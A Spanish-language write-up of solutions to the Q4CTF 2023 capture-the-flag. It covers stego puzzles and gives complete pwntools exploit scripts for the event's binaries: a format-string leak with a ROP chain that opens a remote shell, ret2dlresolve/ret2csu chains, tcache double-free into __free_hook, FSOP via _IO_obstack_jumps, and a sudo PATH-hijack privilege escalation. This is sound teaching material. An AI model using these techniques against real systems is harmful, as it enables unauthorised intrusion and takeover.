# Soluciones Q4CTF 2023

Hola mundo! El fin de semana pasado concluyó [Q4CTF](https://q4hacking.com/) y estoy muy contento con la recepción que tuvo, como siempre la parte más entretenida fué por lejos crear los retos y ver como algunos los resolvían, sin lugar a dudas es algo que llena mi <3.

Ahora, acá van algunas de las soluciones. Fueron varios los retos que creamos para el evento, asi que aca van algunos con los que estoy mas familiarizado, pero pronto concentramos todo.

Algunos de los retos que participé (como los de Windows AD) se vendrán pronto en otra tanda, esperamos poder entregar al menos la guía de solución. Si existe alguna duda con la solución particular d eun reto, pueden contactarme por Telegram o Discord.

# Techno

Para el desafío "Techno" un txt llamado "hacktheplanet.txt" era proporcionado, con eso los concursantes debían comenzar el reto. El archivo de texto contenía un archivo en base64, este archivo es un archivo ejecutable, para convertirse, simplemente lo “decodeamos” y enviamos a un archivo.

```
👾⚡️cat hacktheplanet.txt |base64 -d > test
👾⚡️./test
Lo mejor para el invierno es el techno, mandame tu cancion: 
```
Luego de ejecutar string veremos algunos strings, así como uno que se observa está en base64

![](https://github.com/dplastico/dplastico.github.io/raw/main/_posts/img/2023-07-26-15-18-47.png)

Si decodemaos el string, obtenemos una URL

```
👾⚡️echo "aHR0cDovLzY4LjE4My4xMjUuMjE3L2RldHJvaXQtYmFzZS1hemh4aS8="|base64 -d
http://68.183.125.217/detroit-base-azhxi/
```
![](https://github.com/dplastico/dplastico.github.io/raw/main/_posts/img/2023-07-26-15-20-14.png)

En el sitio suena una canción, la cual usa morse para transmitir el mensaje (se puede inferir del nombre del "autor" del sitio). La flag se repite en un loop, separado por espacios. Con eso se obtiene la flag

Q4{thisisthemorsewawave}

# Super

Este reto de stego consiste en descubrir un mensaje oculto en un zip. El zip tiene clave podemos hacerle bruteforce, el resultado es "forceofwill" con esto obtenemos una foto "super_mod.png" la cual solo contiene un color.

![](https://github.com/dplastico/dplastico.github.io/raw/main/_posts/img/2023-07-26-15-36-32.png)

También un texto que podemos decodear usando base58, el texto es el siguiente.

```
Fecha: 19 de Julio de 1989
UbicaciÃ³n: Desconocida
Soldado:  ¿Hay alguien ahÃ­?  ¿Alguien que pueda escuchar mi transmisiÃ³n?
Hacker: (crackling) SÃ­, te recibo.  ¿QuiÃ©n eres tÃº?  ¿Por quÃ© estÃ¡s usando un canal de comunicaciÃ³n tan antiguo?
Soldado: Soy un ex soldado que necesita entregar informaciÃ³n crucial. No puedo correr el riesgo de ser rastreado. EscuchÃ© que eras el mejor en este tipo de cosas.
Hacker: Interesante. Dime,  ¿quÃ© tipo de informaciÃ³n necesitas transmitir? Y, por favor, ten cuidado con los detalles, no quiero comprometerte ni a ti ni a mÃ­.
Soldado: Estoy intentando decirte sobre una serie de secretos muy delicados, relacionados con... algo que estÃ¡ mÃ¡s allÃ¡ de nuestra comprensiÃ³n. Pero no puedo decir mÃ¡s al respecto. Solo puedo darte una pista.
Hacker: Entendido. SÃ© discreto. Adelante con la pista.
Soldado: La clave estÃ¡ en el nÃºmero 10. Es como una llave para todos los datos importantes. Si aplicas ese nÃºmero de la manera correcta, podrÃ¡s descifrar todo lo que necesitas saber.
Hacker: (curioso) Interesante... Entiendo lo que intentas decir. Me encargarÃ© de hacer lo que sea necesario para descifrar esa informaciÃ³n sin revelarla. Pero debo advertirte, jugar con los nÃºmeros siempre tiene sus riesgos.
Soldado: Lo sÃ©, amigo. Pero confÃ­o en que estÃ¡s a la altura de este desafÃ­o. Solo tÃº puedes entender el valor de esa clave y lo que significa para el mundo.
Hacker: (con determinaciÃ³n) No te preocupes. Si hay un secreto escondido en esa clave, lo descubrirÃ© sin que nadie mÃ¡s lo sepa. UtilizarÃ© todas mis habilidades sin dejar rastro, como un operador silencioso en la 
```

Podemos "inferir" (jajaja, perdón el troleo.) Que podemos hacer un XOR 10 a la imagen, el problema es que si lo hacemos a todo el archivo el png falla y no se puede abrir ya que se daña el formato, por eso debemos hacer el XOR solamente a los bytes de data de imagen, conocimos como [pixel data](https://stackoverflow.com/questions/26456447/interpret-png-pixel-data). Con este script de python se puede obtener la solución (hecho con chat GPT)

```python
def xor_with_0xa(data):
    return bytes(b ^ 0xa for b in data)
def main():
    input_file = "super_mod.png"
    output_file = "final.png"
    try:
        with open(input_file, "rb") as file:
            png_header = file.read(8) # Read the 8-byte PNG header
            chunks = []
            while True:
                length_bytes = file.read(4)
                if not length_bytes:
                    break
                length = int.from_bytes(length_bytes, byteorder="big")
                chunk_type = file.read(4)
                chunk_data = file.read(length)
                crc = file.read(4)
                chunks.append((length_bytes, chunk_type, chunk_data, crc))
        # XOR the pixel data (IDAT chunk) if it exists
        for i, (length_bytes, chunk_type, chunk_data, crc) in enumerate(chunks):
            if chunk_type == b'IDAT': # Modify only the pixel data
                chunks[i] = (length_bytes, chunk_type, xor_with_0xa(chunk_data), crc)
        # Reconstruct the modified PNG file
        with open(output_file, "wb") as file:
            file.write(png_header)
            for length_bytes, chunk_type, chunk_data, crc in chunks:
                file.write(length_bytes)
                file.write(chunk_type)
                file.write(chunk_data)
                file.write(crc)
        print(f"File '{output_file}' created successfully.")
    except FileNotFoundError:
        print(f"Error: File '{input_file}' not found.")
    except Exception as e:
        print(f"Error: {e}")
if __name__ == "__main__":
    main()
```
Luego de ejecutarlo, podemos obtener la flag abriendo el archivo png, en este caso, final.png

![](https://github.com/dplastico/dplastico.github.io/raw/main/_posts/img/2023-07-26-15-41-18.png)

# Kaisen

La solución es:
- steghide (extraer)
- stegbrute (bruteforce pass)
- zzzzzzZzZzZZzZ

# Black Lotus

Black lotus era una máquina bastante interesante, la cual parecía tener un servidor inestable, pero no (al analizar el binario y escribir el exploit era posible darse cuenta). La idea consistía en primero enumerar para descubrir un servidor web en el puerto 80 y otro en el 5555. (Felicitaciones a *fjv* quien fue el único que resolvió esta maquina).

Enumerando el servidor web del puerto 80 podemos encontrar un robots.txt con la siguiente info.

```
User-agent: *
Disallow: /
Disallow: /l0tus
```

En dicho directorio encontramos el binario que corre en puerto 5555, el cual no tiene canary, pero si PIE y NX habilitados.
![](https://github.com/dplastico/dplastico.github.io/raw/main/_posts/img/2023-07-26-15-43-38.png)
Luego de reversarlo, podemos descubrir que la función "DEBUG" permite lekear direcciones de memoria, 3 en específico, la primera, una dirección en el stack, la segunda que obviaremos, y la tercera una dirección del binario en sí. Podemos comprobarlo con un netcat enviando 3 especificadores de formato de tipo puntero (El Bromas!) o "pointer string format specifier", el famosísimo "%p". (debes enviarlo concatenado, ya que los espacios generan un null byte que se traduce en no lekear mas direcciones)

```
👾⚡️nc 167.99.6.79 5555
DEBUG %p-%p-%p
0x7ffc94fa2156-0xffffffe0-0x5577dd3ea080
```

Existe también un buffer overflow en el metodo POST (se puede observar reversando el binario), con lo que con los leaks + overflow podemos escribir un exploit, dado que no tenemos leak de libc, la idea del exploit es enviar el string de "/bin/sh\0" (null byte terminated) en el payload y usar el leak de stack para calcular la dirección relativa al string, luego de eso como el binario está corriendo en un docket, no es posible simplemente "llamar a /bin/sh" lo que debemos hacer es suplicar el stdin y stdout, y enviarlo por el socket, esto se puede hacer usando DUP2(). El exploit es el siguiente.


```python
#!/usr/bin/python3
from pwn import *
import requests
gs = '''
continue
'''
elf = context.binary = ELF('./a.out')
context.terminal = ['tmux', 'splitw', '-hp', '70']
def start():
    if args.GDB:
        return gdb.debug('./a.out', gdbscript=gs)
    if args.REMOTE:
        return remote('167.99.6.79', 5555)
    else:
        return process('./a.out')
r = start()
#========= exploit here ===================
payload = b"DEBUG %p-%p-%p"
r.sendline(payload)
leaks = r.recv(0x2a).split(b"-")
leak = int(leaks[2],16)
base = leak - 0x2080
stack_leak = int(leaks[0], 16)
r.close()
log.info(f"leak = {hex(leak)}")
log.info(f"base address = {hex(base)}")
log.info(f"Stack leak = {hex(stack_leak)}")
poprdi = base+0x00000000000019a3 #pop rdi; ret; 
poprsi = base+0x00000000000019a1 #pop rsi; pop r15; ret;
poprdx = base+0x00000000000017ea #pop rdx; pop r12; xor rdx, qword ptr [2]; ret; 
movrax = base+0x00000000000017f4 #
syscall = base+0x00000000000017f1 #syscall
r = remote('167.99.6.79', 5555)
payload = b"/bin/sh\0"
payload += b"A"*(0x18-len(payload))
payload += p64(poprdi)
payload += p64(33)
payload += p64(movrax)
payload += p64(poprdi)
payload += p64(4)
payload += p64(poprsi)
payload += p64(0)
payload += p64(0)
payload += p64(syscall)
payload += p64(poprdi)
payload += p64(33)
payload += p64(movrax)
payload += p64(poprdi)
payload += p64(4)
payload += p64(poprsi)
payload += p64(1)
payload += p64(0)
payload += p64(syscall)
payload += p64(poprdi)
payload += p64(33)
payload += p64(movrax)
payload += p64(poprdi)
payload += p64(4)
payload += p64(poprsi)
payload += p64(2)
payload += p64(0)
payload += p64(syscall)
payload += p64(poprdi)
payload += p64(59)
payload += p64(movrax)
payload += p64(poprdi)
payload += p64(stack_leak-0x66)
payload += p64(poprsi)
payload += p64(0)
payload += p64(0)
payload += p64(poprdx)
payload += p64(0)
payload += p64(0)
payload += p64(syscall)
r.send(b"POST "+payload)
r.sendline(b"")
r.interactive()
```
al ejecutar lo anterior podemos obtener una shell y leer user.txt

![](https://github.com/dplastico/dplastico.github.io/raw/main/_posts/img/2023-07-26-15-54-47.png)

Luego de eso (es reocmendable tenrer una shell mas estable) si ejecutamos "sudo -l" observaremos lo siuguiente

```
$ sudo -l
Matching Defaults entries for lotus on black-lotus:
    env_reset, mail_badpass,
    secure_path=/home/lotus\:/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty
User lotus may run the following commands on black-lotus:
    (root) NOPASSWD: /bin/backlogs
```

El archivo contiene lo siguiente /bin/backlogs

```
#!/bin/bash
gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
```
Dado que podemos modificar el path (como se observa el home del usuario en este caso), simplemente agregando un archivo llamado "gzip" con algún comando, nos permitirá ejecutar como root el contenido del mismo. Con eso podemos leer la flag

```
root@black-lotus:~# cat flag.txt 
Q4{c0ngr4ts_f3ll0w_pwn3r_th3_c0unc1l_is_waiting_for_you}
root@black-lotus:~# exit
```
# ret2win

Un ret2win, la solución acá:

```python
#!/usr/bin/python3
from pwn import *
gs = '''
continue
'''
elf = context.binary = ELF('./a.out')
context.terminal = ['tmux', 'splitw', '-hp', '70']
def start():
    if args.GDB:
        return gdb.debug('./a.out', gdbscript=gs)
    if args.REMOTE:
        return remote('192.81.216.17', 1212)
    else:
        return process('./a.out')
r = start()
#========= exploit here ===================
ret = 0x40101a
payload = b"A"*0x18
payload += p64(ret) #ubuntu 16 bytes stack alignment
payload += p64(elf.sym.win)
r.sendlineafter(b"N:", payload)
#========= interactive ====================
r.interactive()
```
# Ancestral Recall.

Ancestral recall era un pwn que se resolvía con [ret2DLResolve](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve), también se podía hacer con [ret2csu](https://gist.github.com/kaftejiman/a853ccb659fc3633aa1e61a9e26266e9), yo opté por la última, el exploit es el siguiente.

```python
#!/usr/bin/python3
from pwn import *
gs = '''
continue
'''
elf = context.binary = ELF('./a.out')
libc = elf.libc
context.terminal = ['tmux', 'splitw', '-hp', '70']
def start():
    if args.GDB:
        return gdb.debug('./a.out', gdbscript=gs)
    if args.REMOTE:
        return remote('142.93.122.131', 1313)
    else:
        return process('./a.out')
r = start()
#========= exploit here ===================
rop = ROP(elf)
ret = 0x40101a
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh\0'])
rop.read(0, dlresolve.data_addr)
#rop.raw(rop.ret[0])
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()
payload = b"A"*72
payload += raw_rop
r.sendline(payload)
r.sendline(dlresolve.payload)
#gadgets
pops = 0x4011b2 #pop gadget from ret2csu pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
poprsi = 0x00000000004011b9 # pop rsi; pop r15; ret;
poprbp = 0x0000000000401109 # pop rbp; ret; 
poprdi = 0x00000000004011bb # pop rdi; ret;
rw_section = 0x404100
leaveret = 0x40115c # to pivot to .bss
fini_ptr = 0x403048
bss = 0x404030
ret2csu_gdg = 0x401198
#ca syscall
#1
payload = b"A"*0x48
#calling read() to write the 1st ROP chain ion the.bss section
payload += p64(poprdi)
payload += p64(0)
payload += p64(poprsi)
payload += p64(rw_section)
payload += p64(0xcafebabe)
payload += p64(elf.sym.read)
payload += p64(elf.sym.vuln)
#/bin/sh
r.sendline(payload)
#payload 1 on .bss
#storing the string /bin/sh
buf = b"/bin/sh\0"
#ret2csu
buf += p64(pops)
buf += p64(0) #rbx
buf += p64(1) #rbp
buf += p64(1) #r12 -> RDI
buf += p64(elf.got.read) #r13 = > rsi
buf += p64(0x3b) #r14 => RDX
buf += p64(fini_ptr) #r15
buf += p64(ret2csu_gdg) #
buf += p64(0xcafebabe) # dummy add rsp + 0x8
buf += p64(0) #rbx
buf += p64(1) #rbp
buf += p64(0) #r12
buf += p64(0) #r13 
buf += p64(0) #r14 
buf += p64(0) #r15
buf += p64(elf.sym.read) #syscall write()
buf += p64(poprbp)
buf += p64(rw_section+0x100) #second ROP chain
buf += p64(leaveret) #pivot
sleep(1)
r.sendline(buf)
#payload 2 in .bss
payload = b"A"*0x48
#calling read() to write the 2nd ROP chain on the.bss section
payload += p64(poprdi)
payload += p64(0)
payload += p64(poprsi)
payload += p64(rw_section+0x100)
payload += p64(0xcafebabe)
payload += p64(elf.sym.read)
payload += p64(elf.sym.vuln)
sleep(1)
r.sendline(payload)
#payload 2 on .bss
buf = b"YYYYYYYY" #padding
#ret2csu
buf += p64(pops)
buf += p64(0) #rbx
buf += p64(1) #rbp
buf += p64(rw_section) #r12 -> RDI /bin/sh
buf += p64(0) #r13 = > rsi 0
buf += p64(0) #r14 => RDX
buf += p64(fini_ptr) #r15
buf += p64(ret2csu_gdg) #
buf += p64(0xcafebabe) # dummy add rsp + 0x8
buf += p64(0) #rbx
buf += p64(1) #rbp
buf += p64(0) #r12
buf += p64(0) #r13 
buf += p64(0) #r14 
buf += p64(0) #r15
buf += p64(elf.sym.read) #syscall execve()
buf += p64(0xdeadbeef)
sleep(1)
r.sendline(buf)
#3
payload = b"A"*0x48
payload += p64(poprdi)
payload += p64(0)
payload += p64(poprsi)
payload += p64(elf.got.read)
payload += p64(0xcafebabe)
payload += p64(elf.sym.read)
payload += p64(0x401109) #pop rbp
payload += p64(rw_section)
payload += p64(leaveret) #pivot
sleep(1)
r.sendline(payload)
sleep(1)
r.send(b"\x8c")
#========= interactive ====================
r.interactive()
```
# Baby heap

Baby heap, era un baby heap.

```python
#!/usr/bin/python3
from pwn import *
gs = '''
continue
'''
elf = context.binary = ELF('./bin')
context.terminal = ['tmux', 'splitw', '-hp', '70']
def start():
    if args.GDB:
        return gdb.debug('./bin', gdbscript=gs)
    if args.REMOTE:
        return remote('165.227.92.222', 4455)
    else:
        return process('./bin')
r = start()
index = 0
def allocate(size, data):
    global index
    index += 1
    r.sendline(b"1")
    r.sendlineafter(b"size :", str(size))
    r.sendlineafter(b"data :", data)
    r.recvuntil(b">")
    return index - 1
def delete(index):
    r.sendline(b"2")
    r.sendlineafter(b"index :", str(index))
    r.recvuntil(b">")
#========= exploit here ===================
a = allocate(0x18, b"AAAAA")
b = allocate(0x18, b"BBBBB")
delete(a)
delete(a)
#print(hex(elf.sym.win))
#
allocate(0x18, p64(0x404070)) #exit en got
#sleep(0.5)
allocate(0x18, b"AAAAA" )
#sleep(0.5)
allocate(0x18, p64(0x401296))
r.sendline(b"3")
#========= interactive ====================
r.interactive()
```
# Hope

Hope es un típico "note" challenge que no tuvo “solves”, El binario usa libc 2.31 con un bug de double free. Al no tener función de "print" o "read" por lo que para poder hacer un lekear sobreescribiendo el struct del stdout, usando un house of botcake, Además de hacer un bruteforce de 1/16 a un nibble debido a que el binario tiene PIE. Con lo anterior podemos hacer un leak y luego un tcache poiton + house of botcake para explotar, esta combinacion de tecnicas la puse ya en un post pasado y la llame [House of Plastic Cake](https://dplastico.github.io/sin%20categor%C3%ADa/2021/10/17/Learning-Double-Restrictions-The-house-of-plastic-cake.html) por la combinación de tecnicas que usa. El exploit (con algunos comentarios) es el siguiente.

```python
#!/usr/bin/python3
from pwn import *
gs = '''
continue
'''
index = 0
elf = context.binary = ELF('./land')
context.terminal = ['tmux', 'splitw', '-hp', '75']
libc = elf.libc
def start():
    if args.GDB:
        return gdb.debug('./land', gdbscript=gs)
    if args.REMOTE:
        return remote('146.190.208.80', 1234)
    else:
        return process('./a.out')
r = start()
r.timeout = 0.8
#functions
def add(size, data):
    r.sendline(b"1")
    r.sendlineafter(b"target : ", f"{size}".encode())
    r.sendafter(b"your ammo :", data)
    r.recvuntil(b">")
    global index
    index += 1
    return index - 1    
def delete(index):
    r.sendline(b"2")
    r.sendlineafter(b"destroy : ", f"{index}".encode())
    r.recvuntil(b">")
# exploit
#========= exploit here ===================
for i in range(7):
    add(0x98, b"AAAA")
#botcake?
prev = add(0x98, b"AAAA")
victim = add(0x98, b"BBBB")
guard = add(0x18, b"/bin/sh\0")
for i in range(7):
    delete(i)
delete(victim)
delete(prev)
junk = add(0x98, "CCCC") # to avoid the victim chunk  going to the unsorted bin and trigger other mallocs d free mitigation
add(0x98, "FFFF") # same as above to "triple free"
#double free
delete(victim)
#'house of plastic-cake'
#This add the size field and modify the key field to bypass double free restriction
#WE do this so we can "triple free to have a chunk to comeback later on"
#But most important to push a libc address down the heap to have a pointer to corrupt with the editor chunk
c = add(0xb8, p64(0)*19 +p64(0xa1)+p64(0)+p16(0)) 
victim = add(0x98, p64(0)*3 +p64(0x81)+p16(0xa6a0))
#delete victim again after editing the libc address, this time to get a pointer on the heap
delete(victim) 
# we repeat this twice so the address will be the same, so we can have a fix value to only modify one nibble
#editor
#deletc c again to edit 
delete(c)
c = add(0xb8, p64(0)*19 +p64(0xa1)+p64(0)+p16(0)) 
#we can delete the victim again to have a double free scenario again
delete(victim)
#add the vitim modifying the last nibble
add(0x98, p8(0xc0))
#add anotehr one to make the next one a chunk from the stdout
add(0x98, p64(0xcafebabe))
# request a chunk from the stdout
add(0x98, p64(0xdeadbeef))
# request a chunk from the stdout
## manual call to display stdout to avoid buffering issues with wrapper function
r.sendline(b"1")
r.sendlineafter(b"size :", f"{0x98}".encode())
r.sendafter(b"data :", p64(0xfbad1800)+p64(0)+p64(0)+b"dpladpla"+p16(0))
#bruteforce stuff
r.recvuntil(b"dpladpla")
leak = u64(r.recvline()[8:14].ljust(8, b"\x00"))
log.info(f"leak = {hex(leak)}")
#
##with the leak now we can calculate the base to libc address
libc.address = leak-0x1ed723
log.info(f"libc = {hex(libc.address)}")
## delete the victim again and the editor so we can edit again
delete(c)
delete(victim)
## we edit our victim chunk to point to the free hook
c = add(0xb8, p64(0)*19 +p64(0xa1)+p64(libc.sym.__free_hook) )
##requesting a chunk to write the free hook in the tcache 
add(0x98, p64(0xdeadbeef))
## writing the system address to the free hook
victim = add(0x98, p64(libc.sym.system))
#
##free the guard chunk with the /bin/sh string taht will be pass as argument to the hook
delete(guard)
#========= interactive ====================
r.interactive()
```
# Land

Land es un desafío cradp para explotar usando FSOP en glibc 2.31 (para que no sea tan difícil uwu).

El binario es un binario que escribe a un file stream y luego flushea el buffer, simulando una operación de FSOP, con esto podemos controlar el "flush" sin dificultad y sobreescribir el puntero ya que el binario permite sobreescribir el stream.

Para lekea primero debemos hacer el siguiente FSOP

*_IO_file_doallocate* > *_IO_buf_base* => call *_IO_new_file_sync* => *_IO_do_flush* con los argumentos. 

Para esto debemos setear correctamente los argumentos: *_fileno* debe ser 1 (stdout),*_IO_write_base* and *_IO_read_end* tienen la dirección base desde donde lekear, *_IO_write_ptr* indica el final del buffer. Controlando esto podemos obtener una dirección de heap y luego de libc (hay que hacerlo dos veces modificando los parámetros acorde)
Luego podemos obtener una shell usando el siguiente FSOP
 
*_IO_obstack_overflow* => *CALL_FREEFUN*.

Los requerimientos del struct *obstack* deben cumplirse para que el punter *fp* llamé correctamente a *CALL_FREEFUN*
Con esto obtenemos una shell, aca el exploit con más detalle.

```python
#!/usr/bin/python3
from pwn import *
# # break in fflush if needed to inspect the file stream
gs = '''
continue
'''
elf = context.binary = ELF('./chall')
context.terminal = ['tmux', 'splitw', '-hp', '70']
libc = elf.libc
def start():
    if args.GDB:
        return gdb.debug('./chall', gdbscript=gs)
    if args.REMOTE:
        return remote('146.190.77.77', 1337)
    else:
        return process('./chall')
r = start()
#r.timeout = 1
def flush():
    r.sendline(b"1")
    #r.recvuntil(b">")
def trick(offset, value):
    r.sendline(b"2")
# sleep(1)
    r.sendlineafter(b"Mana:", str(offset).encode())
    r.sendlineafter(b"Spell:", str(value))
    r.recvuntil(b">")
def write_addr(offset, addr):
    addr = p64(addr)
    for i in range(8):
        trick(offset+i, addr[i])
#========= exploit here ===================
# Setting the offsets for the filestream
_flags =0x0
_IO_read_ptr = 8
_IO_read_end = 0x10
_IO_read_base = 0x18
_IO_write_base = 0x20
_IO_write_ptr = 0x28
_IO_write_end = 0x30
_IO_buf_base = 0x38
_IO_buf_end = 0x40
_IO_save_base = 0x48
_IO_backup_base = 0x50
_IO_save_end = 0x58
_markers = 0x60
_chain = 0x68
_fileno = 0x70
_mode=0xc0
_vtable = 0xd8
#executing _IO_file_doallocate to populate _IO_buf_base with a heap address
trick(_vtable, 0xa8)
flush()
sleep(1)
#restoring the vtable
trick(_vtable, 0xa0)
#making _IO_write_ptr > _IO_write_base 
trick(_IO_write_ptr, 1)
flush()
sleep(1)
#leaking libc
trick(_fileno, 1)
trick(_IO_write_ptr, 0x78)
trick(_IO_write_base, 0x70)
trick(_IO_read_end, 0x70)
flush()
sleep(1)
#receiving the leak and calculating libc base address
leak = u64(r.recvuntil(b"Done.").split(b"Done.")[0][1:8].ljust(8,b"\x00"))
log.info(f"leak = {hex(leak)}")
libc.address = leak - 0x1e8f60
log.info(f"libc = {hex(libc.address)}")
#getting a heap leak
trick(_fileno, 1)
#calculating topchunk address in the main arena
topchunk = libc.address + 0x1ecbe0
log.info(f"top_chunk = {hex(topchunk)}")
write_addr(_IO_write_ptr, topchunk+8)
write_addr(_IO_write_base, topchunk)
write_addr(_IO_read_end, topchunk)
#write_addr(_flags, (0xfbad1800 | 0x8000))
sleep(1)
flush()
#receiving the leak and calculating addresses
heap_leak = u64(r.recvuntil(b"Done.").split(b"Done.")[0][1:8].ljust(8, b"\x00"))
log.info(f"heap_leak = {(hex(heap_leak))}")
heap_base = heap_leak - 0x2480
log.info(f"Heap base = {hex(heap_base)}")
#shifting the vtable to point __sync to _IO_obstack_jumps 
shift_obstack_jumps = libc.address + 0x1e9218
log.info(f"shift_obstack_jumps = {hex(shift_obstack_jumps)}")
write_addr(_vtable, shift_obstack_jumps)
#writing the obstack struct pointers
write_addr(0xe0, heap_base+0x2a0)
write_addr(_flags, heap_base+0x2a0)
#setting arguments for CALL_FREEFUN within _obstack_newchunk
log.info(f"system = {hex(libc.sym.system)}")
write_addr(_IO_backup_base, 0xdeadbeef)
write_addr(_IO_buf_base, libc.sym.system) # function to call
log.info(f"/bin/sh = {hex(next(libc.search(b'/bin/sh')))}")
write_addr(_IO_save_base, next(libc.search(b'/bin/sh'))) # arg of function
#drop a shell
flush()
#========= interactive ====================
r.interactive()
```

